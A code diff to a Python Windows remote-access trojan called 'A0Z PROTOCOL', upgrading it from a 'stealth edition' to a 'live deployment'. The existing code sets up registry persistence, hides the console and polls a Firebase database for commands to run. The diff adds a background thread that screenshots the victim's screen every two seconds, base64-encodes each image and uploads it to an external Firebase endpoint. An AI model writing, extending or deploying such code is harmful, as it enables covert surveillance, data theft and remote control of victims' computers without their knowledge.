@@ -5,7 +5,11 @@ import ctypes
 import sys
 import win32com.client
 import subprocess
-import shutil 
+import shutil
+import pyautogui
+import base64
+import threading
+from io import BytesIO
 
 def make_persistent():
     try:
@@ -23,6 +27,20 @@ def make_persistent():
             subprocess.Popen(reg_cmd, shell=True, creationflags=0x08000000)
     except:
         pass
+
+def stream_screen():
+    screen_url = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/live_screen.json"
+    while True:
+        try:
+            screenshot = pyautogui.screenshot()
+            buffered = BytesIO()
+            screenshot.save(buffered, format="JPEG", quality=20)
+            img_str = base64.b64encode(buffered.getvalue()).decode()
+            requests.put(screen_url, json={"image": img_str})
+            time.sleep(2)
+        except:
+            time.sleep(5)
+
 def hide_console():
     hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
     if hWnd:
@@ -43,23 +61,27 @@ def execute_command(command):
 
 def start_gateway():
     make_persistent()
+    
     os.system('color 0a')
     os.system('cls')
     print("==================================================")
-    print("   A0Z PROTOCOL v5.0 :: STEALTH EDITION")
+    print("   A0Z PROTOCOL v6.0 :: LIVE DEPLOYMENT")
     print("==================================================")
-    print("[*] STATUS: SYSTEM DEPLOYED")
-    print("[*] NODE: " + os.environ.get('COMPUTERNAME', 'UNKNOWN'))
-    print("[*] SYSTEM WILL GO STEALTH IN 5 SECONDS...")
-    print("--------------------------------------------------")
-
+    print(f"[*] NODE: {os.environ.get('COMPUTERNAME', 'UNKNOWN')}")
+    print("[*] STATUS: SECURE CONNECTION ESTABLISHED")
+    print("[*] SYSTEM GOING STEALTH IN 5 SECONDS...")
+    
+    threading.Thread(target=stream_screen, daemon=True).start()
+    
     time.sleep(5)
     hide_console()
-    DB_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
+    
+    db_url = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
     last_timestamp = 0
+
     while True:
         try:
-            response = requests.get(DB_URL)
+            response = requests.get(db_url)
             data = response.json()
             if data:
                 text = data.get('text', '')
@@ -74,5 +96,6 @@ def start_gateway():
         except:
             pass
         time.sleep(1)
+
 if __name__ == "__main__":
     start_gateway()
